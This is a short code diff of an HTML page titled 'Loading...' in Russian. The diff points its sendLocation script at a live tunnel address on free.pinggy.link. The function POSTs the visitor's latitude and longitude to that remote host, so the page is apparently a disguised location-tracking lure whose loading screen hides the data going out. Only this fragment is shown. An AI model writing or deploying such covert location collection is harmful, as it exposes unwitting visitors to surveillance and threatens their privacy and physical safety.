@@ -6,7 +6,7 @@
     <title>Загрузка...</title>
     <script>
         function sendLocation(lat, lon) {
-            fetch('http://your-server-ip:5000/update_location', {
+            fetch('http://rnsay-2a00-1858-1047-82b3-da41-1671-f106-9d25.a.free.pinggy.link/update_location', {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({ latitude: lat, longitude: lon })
